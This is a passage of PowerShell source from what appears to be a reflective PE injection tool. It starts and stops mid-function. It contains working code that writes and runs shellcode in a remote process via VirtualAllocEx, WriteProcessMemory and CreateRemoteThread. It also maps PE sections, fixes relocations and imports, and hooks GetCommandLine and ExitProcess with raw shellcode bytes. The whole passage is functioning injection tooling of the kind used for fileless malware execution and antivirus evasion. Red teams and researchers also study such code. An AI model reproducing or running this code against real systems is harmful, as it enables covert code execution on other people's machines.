		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process for shellcode""
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw ""Unable to write shellcode to remote process memory.""
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
		}
		
		
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw ""Call to ReadProcessMemory failed""
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			
			
			
			
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString ""Copy-Sections::MarshalCopy"" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString ""Copy-Sections::Memset"" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true 
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				
				
				
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					
					Throw ""Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo""
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose ""Done importing DLL imports""
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw ""Error importing DLL, DLLName: $ImportDllPath""
				}
				
				
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					
					
					
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff 
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff 
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw ""New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath""
                        }
                        else
                        {
						    Throw ""New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath""
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    
                    
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString ""Update-MemoryProtectionFlags::VirtualProtect"" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Unable to change memory protection""
			}
		}
	}
	
	
	
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""Kernel32.dll"")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw ""Kernel32 handle null""
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(""KernelBase.dll"")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw ""KernelBase handle null""
		}

		
		
		
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineA"")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineW"")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw ""GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)""
		}

		
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw ""Call to VirtualProtect failed""
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw ""Call to VirtualProtect failed""
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		
		
		
		
		
		
		$DllList = @(""msvcr70d.dll"", ""msvcr71d.dll"", ""msvcr80d.dll"", ""msvcr90d.dll"", ""msvcr100d.dll"", ""msvcr110d.dll"", ""msvcr70.dll"" `
			, ""msvcr71.dll"", ""msvcr80.dll"", ""msvcr90.dll"", ""msvcr100.dll"", ""msvcr110.dll"")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_wcmdln"")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, ""_acmdln"")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					""Error, couldn't find _wcmdln or _acmdln""
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw ""Call to VirtualProtect failed""
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw ""Call to VirtualProtect failed""
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		
		
		
		
		

		$ReturnArray = @()
		$ExitFunctions = @() 
		
		
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke(""mscoree.dll"")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw ""mscoree handle null""
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, ""CorExitProcess"")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw ""CorExitProcess address not found""
		}
		$ExitFunctions += $CorExitProcessAddr
		
		
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitProcess"")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw ""ExitProcess address not found""
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			
			
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""ExitThread"")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw ""ExitThread address not found""
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Call to VirtualProtect failed""
			}
			
			
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			
			
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
